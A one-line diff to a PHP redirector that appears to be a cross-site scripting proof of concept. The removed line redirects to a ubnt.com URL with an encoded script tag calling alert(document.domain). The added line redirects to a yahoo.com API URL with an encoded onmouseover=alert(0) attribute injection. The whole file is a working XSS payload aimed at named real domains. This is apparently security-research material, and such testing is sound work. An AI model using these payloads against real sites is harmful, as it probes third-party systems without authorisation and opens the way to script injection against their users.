@@ -1,1 +1,1 @@
-<?php header('location: https://dev-unifi-go.ubnt.com/sss%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E') ?> 
+<?php header('location: http://api.view.yahoo.com/api/series/xxxxxa%3Cq~%250aonmouseover=alert(0)%3E') ?> 
